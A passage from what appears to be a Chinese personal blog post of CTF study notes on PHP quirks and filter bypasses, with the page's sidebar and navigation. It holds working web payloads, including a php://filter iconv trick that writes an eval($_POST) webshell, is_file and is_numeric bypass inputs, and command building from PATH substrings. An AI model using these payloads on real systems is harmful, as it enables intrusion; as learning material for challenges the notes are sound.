class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>

<h1 id="三目运算符的理解-变量覆盖"><a href="#三目运算符的理解-变量覆盖" class="headerlink" title="三目运算符的理解+变量覆盖"></a>三目运算符的理解+变量覆盖</h1><h4 id="is-numeric与hex2bin"><a href="#is-numeric与hex2bin" class="headerlink" title="is_numeric与hex2bin"></a>is_numeric与hex2bin</h4><p> is_numeric在PHP5中是可以识别十六进制的，hex2bin参数不能带0x</p>
<p>PHP文档</p>
<h5 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin"></a>hex2bin</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string hex2bin( string $data)</span><br></pre></td></tr></table></figure>

<p>这个函数<em>不是</em> 转换十六进制数字为二进制数字。这种转换(指将十六进制数字转换为二进制数字)可以使用<a href="mk:@MSITStore:D:\mytools\WEB\PHPSC\PHP7中文手册(2018).chm::/res/function.base-convert.html">base_convert()</a> 函数。 </p>
<h5 id="base-convert"><a href="#base-convert" class="headerlink" title="base_convert"></a>base_convert</h5><p>base_convert — 在任意进制之间转换数字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string base_convert( string $number, int $frombase, int $tobase)</span><br></pre></td></tr></table></figure>

<h4 id="sha1比较缺陷"><a href="#sha1比较缺陷" class="headerlink" title="sha1比较缺陷"></a>sha1比较缺陷</h4><p>sha1无法处理数组，如下可使用a[]&#x3D;1&amp;b[]&#x3D;1数组绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但MD5或者sha1这种如果强制类型转换后，就不接受数组了，这个时候就要找真正的编码后相同的了，如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line">经实验不行。。。。</span><br><span class="line">下面这个可以</span><br><span class="line">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line">    </span><br><span class="line">array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>

<h4 id="PHP双-的变量覆盖"><a href="#PHP双-的变量覆盖" class="headerlink" title="PHP双$($$)的变量覆盖"></a>PHP双$($$)的变量覆盖</h4><p>在双写$的时，属于动态变量，就是后面的变量值作为新的变量名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="string">&quot;jinmuu&quot;</span>;		<span class="comment">//$test等于jinmuu</span></span><br><span class="line"><span class="variable">$$test</span>=<span class="string">&quot;uu&quot;</span>;	<span class="comment">//$$test=$jinmuu 这里等于给$jinmuu赋值为uu</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;	<span class="comment">//jinmuu</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$test</span>;	<span class="comment">//uu</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jinmuu</span>;	<span class="comment">//uu</span></span><br></pre></td></tr></table></figure>

<h4 id="parse-str函数的使用"><a href="#parse-str函数的使用" class="headerlink" title="parse_str函数的使用"></a>parse_str函数的使用</h4><p>parse_str会把字符串解析为变量，</p>
<p>可以同时赋多个值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;q=jin&amp;w=mu&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$q</span>;<span class="comment">//jin</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$w</span>;<span class="comment">//mu</span></span><br></pre></td></tr></table></figure>

<p>第二个参数会作为数组，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;q=jin&amp;w=mu&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>[<span class="string">&#x27;q&#x27;</span>];<span class="comment">//jin</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>[<span class="string">&#x27;w&#x27;</span>];<span class="comment">//mu</span></span><br></pre></td></tr></table></figure>

<p>php8版本必须要有第二个参数，php7不影响使用但会警告一下</p>
<h4 id="ereg-00正则截断"><a href="#ereg-00正则截断" class="headerlink" title="ereg %00正则截断"></a>ereg %00正则截断</h4><p>ereg PHP5.3废弃了，功能可以由preg_match代替，ereg有个截断漏洞，字符串里包括%00就只匹配%00之前的内容。所以可以前面根据正则改，后面是执行语句，如果有strrev() 这种字符串反转函数配合用更好。</p>
<p><strong>15、迭代器获取当前目录</strong></p>
<p>FilesystemIterator可以获得文件目录，参数需要 <code>.</code> 或者具体路径，getcwd()这个函数可以获取当前文件路径，二者在一定条件下配合使用较好</p>
<p><strong>16、$GLOBALS全局变量的使用</strong></p>
<p>$GLOBALS — 引用全局作用域中可用的全部变量<br>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<p>构造出var_dump($GLOBALS);可以输出全部变量值，包括自定义</p>
<h4 id="php伪协议绕过is-file-highlight-file对于php伪协议的使用"><a href="#php伪协议绕过is-file-highlight-file对于php伪协议的使用" class="headerlink" title="php伪协议绕过is_file highlight_file对于php伪协议的使用"></a>php伪协议绕过is_file highlight_file对于php伪协议的使用</h4><p>is_file判断给定文件名是否为一个正常的文件，返回值为布尔类型。is_file会认为php伪协议不是文件。但highlight_file认为伪协议可以是文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上的代码，可以传入php伪协议进行绕过并且显示含有flag的文件。若有过滤，可以换其他伪协议或改编码方式</p>
<p>另外即使是反序列化也可以用伪协议读文件</p>
<h4 id="多写根目录绕过is-file"><a href="#多写根目录绕过is-file" class="headerlink" title="多写根目录绕过is_file"></a>多写根目录绕过is_file</h4><p>在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的，也就是如果在命令行中输入ls &#x2F;proc&#x2F;self&#x2F;root，其实显示的内容是根目录下的内容<br>多次重复后绕过is_file的具体原理尚不清楚。如上面的代码，也可以用下面payload代替</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>但is_file认为这个不是文件</p>
<h4 id="trim函数的绕过-is-numeric绕过"><a href="#trim函数的绕过-is-numeric绕过" class="headerlink" title="trim函数的绕过+is_numeric绕过"></a>trim函数的绕过+is_numeric绕过</h4><h5 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">参数	描述</span><br><span class="line">string	        必需。规定要检查的字符串。</span><br><span class="line">charlist	    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class="line"></span><br><span class="line">&quot;\0&quot;       - NULL</span><br><span class="line">&quot;\t&quot;       - 制表符</span><br><span class="line">&quot;\n&quot;       - 换行</span><br><span class="line">&quot;\x0B&quot;     - 垂直制表符</span><br><span class="line">&quot;\r&quot;       - 回车</span><br><span class="line">&quot; &quot;        - 空格</span><br></pre></td></tr></table></figure>

<p> 去除字符串首尾处的空白字符（或者其他字符）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string trim( string $str[, string $character_mask = &quot; \t\n\r\0\x0B&quot;] )</span><br></pre></td></tr></table></figure>

<p>is_numeric绕过除数字以外下面这些也可以通过is_numeric函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%09</span><br><span class="line">%0A</span><br><span class="line">%0B</span><br><span class="line">%0C</span><br><span class="line">%0D</span><br><span class="line">+</span><br><span class="line">%2B</span><br><span class="line">-</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>可以用这个测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了+-.号以外还有只剩下%0c也就是换页符了，trim默认时没有剔除%0c。形如以下代码可以绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:<code>num=%0c36</code></p>
<h4 id="绕过死亡die"><a href="#绕过死亡die" class="headerlink" title="绕过死亡die"></a>绕过死亡die</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>

<p>这道看了羽师傅wp，过滤了许多协议，这是取一个 UCS-2LE UCS-2BE</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?</span><br></pre></td></tr></table></figure>

<p><strong><img src="C:\Users\29506\AppData\Roaming\Typora\typora-user-images\image-20221116171941993.png" alt="image-20221116171941993"></strong></p>
<p>可以用这个来测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php eval($_POST[12]) ;?&gt;?&lt;hp pvela$(P_SO[T]1;)&gt;?&#x27;</span>);</span><br><span class="line"><span class="comment">//我们可以通过增减空格来让他保持位偶数。</span></span><br></pre></td></tr></table></figure>

<h1 id="通过内置bash命令构造命令"><a href="#通过内置bash命令构造命令" class="headerlink" title="通过内置bash命令构造命令"></a>通过内置bash命令构造命令</h1><p>在许多命令被过滤时，可以一个字母一个字母得构造，而这些字母从内置变量里面截，比如构造<code>nl</code>，可以写为下面这种方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125;</span><br></pre></td></tr></table></figure>

<p>在linux中可以用<code>~</code>获取变量的最后几位，也可以写为<code>$&#123;PATH:~0&#125;$&#123;PWD:~0&#125;</code>，字母与0作用一样，<code>$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;</code>也是nl，flag.php也过滤了的话可以用????.???，具体情况，具体对待</p>
<p><strong>但是内置变量如何知道捏？烤鸡吗？</strong></p>
<h4 id="PHP变量名非法字符"><a href="#PHP变量名非法字符" class="headerlink" title="PHP变量名非法字符"></a>PHP变量名非法字符</h4><p>比如传入AA_BB.CC这个变量，PHP是不允许变量名中含有<code>.</code> 的，会默认将不合法字符替换为<code>_</code>,如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="meta">?&gt;</span>         </span><br><span class="line">传值：AA.BB.CC=<span class="number">14</span></span><br><span class="line">输出：<span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">&quot;AA_BB_CC&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;14&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<p>但输入<code>AA[BB.CC</code>它就只替换 <code>[</code> 输出 array(1) { [“AA_BB.CC”]&#x3D;&gt; string(2) “14” }</p>
<p>但是当参数前面已经有一个<code>[</code>被转换为<code>_</code>后面的<code>.</code>就不会被转义了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是当[提前出现后，后面的点就不会再被转义了，such as：`CTF[SHOW.COM`=&gt;`CTF_SHOW.COM`</span><br></pre></td></tr></table></figure>

<h4 id="gettext拓展的使用"><a href="#gettext拓展的使用" class="headerlink" title="gettext拓展的使用"></a>gettext拓展的使用</h4><p>在开启该拓展后 <code>_()</code> 等效于 <code>gettext()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启该拓展后 _() 等效于 gettext()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">结果  phpinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">结果 phpinfo</span><br></pre></td></tr></table></figure>

<p>所以 call_user_func(‘_’,’phpinfo’) 返回的就是phpinfo</p>
<p>因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars</p>
<p>get_defined_vars ( void ) : array<br>此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。<br>payload:f1&#x3D;_&amp;f2&#x3D;get_defined_vars</p>
<h4 id="调用类中的函数"><a href="#调用类中的函数" class="headerlink" title="调用类中的函数"></a>调用类中的函数</h4><p>-&gt;用于动态语境处理某个类的某个实例<br>::可以调用一个静态的、不依赖于其他初始化的类方法</p>
<p>也就是说双冒号不用实例化类就可以调用类中的静态方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>这个传入ctfshow&#x3D;ctfshow::getFlag即可</p>
<h4 id="return绕过"><a href="#return绕过" class="headerlink" title="return绕过"></a>return绕过</h4><p><code>eval(&quot;return 1;phpinfo();&quot;);</code>会发现是无法执行phpinfo()的，但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code>是可以执行phpinfo()命令的。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io">Jinmu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jinmu1108.github.io/Web/PHP%E7%89%B9%E6%80%A7/">https://jinmu1108.github.io/Web/PHP%E7%89%B9%E6%80%A7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jinmu1108.github.io" target="_blank">J1Nmu</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/Web/XXE/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">XXE</div></div></a></div><div class="next-post pull-right"><a href="/%E9%A2%98%E8%A7%A3/SkyNICO%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E4%B8%89%E6%A0%A1%E8%81%94%E8%B5%9B(J1Nmuu)/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SkyNICO新生赛</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/Web/XXE/" title="XXE"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-19</div><div class="title">XXE</div></div></a></div><div><a href="/%E4%BC%AA%E5%8D%8F%E8%AE%AE/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="伪协议"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-31</div><div class="title">伪协议</div></div></a></div><div><a href="/Web/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">命令执行</div></div></a></div><div><a href="/Python/python/" title="pyhton"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-01</div><div class="title">pyhton</div></div></a></div><div><a href="/%E7%AC%94%E8%AE%B0/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-29</div><div class="title">正则表达式</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jinmu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" 